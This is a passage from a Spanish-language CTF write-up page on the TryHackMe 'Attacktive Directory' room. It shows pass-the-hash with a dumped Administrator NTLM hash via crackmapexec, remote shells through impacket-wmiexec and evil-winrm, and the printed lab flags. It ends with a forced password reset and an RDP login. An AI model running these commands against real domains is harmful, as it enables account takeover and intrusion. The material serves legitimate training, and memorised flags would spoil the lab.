+ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
+[*] Cleaning up...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos el hash de <code class="language-plaintext highlighter-rouge">Administrator</code>, al ser Domain Admin devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="az">[+] </span><span class="p">spookysec.local\Administrator:0e0363213e37b94221497260b0bcb4fc </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este punto con un <code class="language-plaintext highlighter-rouge">passthehash</code> podemos obtener una <code class="language-plaintext highlighter-rouge">powershell</code> haciendo uso de <code class="language-plaintext highlighter-rouge">impacket</code> con <code class="language-plaintext highlighter-rouge">psexec</code> y <code class="language-plaintext highlighter-rouge">wmiexec</code> o simplemente por <code class="language-plaintext highlighter-rouge">winrm</code> con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">spookysec.local/Administrator@10.10.227.11 -hashes :0e0363213e37b94221497260b0bcb4fc -shell-type powershell  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+thm-ad\administrator
+PS C:\></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+thm-ad\administrator
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde el directorio <code class="language-plaintext highlighter-rouge">C:\Users</code> podemos buscar con <code class="language-plaintext highlighter-rouge">dir</code> de manera recursiva las <code class="language-plaintext highlighter-rouge">flags</code> que terminan en <code class="language-plaintext highlighter-rouge">.txt</code> y leerlas simplemente pipeandolas con un <code class="language-plaintext highlighter-rouge">type</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users> </span><span class="am">dir </span><span class="c1">-recurse </span><span class="p">*.txt
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  11:39 AM             32 root.txt
+
+    Directory: C:\Users\backup\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  12:19 PM             26 PrivEsc.txt
+
+    Directory: C:\Users\backup.THM-AD\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020   1:08 PM             26 PrivEsc.txt
+
+    Directory: C:\Users\svc-admin\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  12:18 PM             28 user.txt.txt  
+
+</span><span class="p">PS C:\Users> </span><span class="am">dir </span><span class="c1">-recurse </span><span class="p">*.txt | </span><span class="am">type  </span><span class="p">
+TryHackMe{4ctiveD1rectoryM4st3r}
+TryHackMe{B4ckM3UpSc0tty!}
+TryHackMe{B4ckM3UpSc0tty!}
+TryHackMe{K3rb3r0s_Pr3_4uth}
+PS C:\Users></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En caso de que quisieramos obtener una interfaz grafica con <code class="language-plaintext highlighter-rouge">RDP</code> podemos cambiar la <code class="language-plaintext highlighter-rouge">contraseña</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> y conectarnos haciendo uso de <code class="language-plaintext highlighter-rouge">xfreerdp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">net </span><span class="p">user Administrator password123#  
+The command completed successfully.
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ xfreerdp </span><span class="p">/u:Administrator /p:password123# /v:spookysec.local /cert:ignore /dynamic-resolution  </span>
+</code></pre></div></div><br>
+
+<a href="/thm/attacktivedirectory/3.png" target="_blank"><div><p><img src="/thm/attacktivedirectory/3.png"></p></div></a>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
